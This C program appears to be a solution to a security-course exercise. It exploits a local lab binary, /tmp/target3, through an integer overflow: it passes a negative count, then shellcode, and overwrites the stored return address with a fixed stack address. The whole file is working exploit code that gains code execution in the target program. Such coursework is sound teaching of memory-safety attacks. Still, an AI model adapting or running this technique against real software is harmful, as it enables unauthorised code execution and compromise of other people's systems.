#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  // (4294967295 / 20) - 1000
  char *count = "-214747364";
  int len = strlen(count) + 1 + 20016;
  char exploit[len];
  memset(exploit, 0xff, len);
  memcpy(exploit, count, strlen(count));
  exploit[strlen(count)] = ',';
  memcpy(exploit + strlen(count) + 1, shellcode, sizeof(shellcode) - 1);

  int *ret = (int *)(exploit + strlen(count) + 1 + 20004);
  *ret = 0xbfff61f8;

  args[0] = TARGET; args[1] = exploit; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
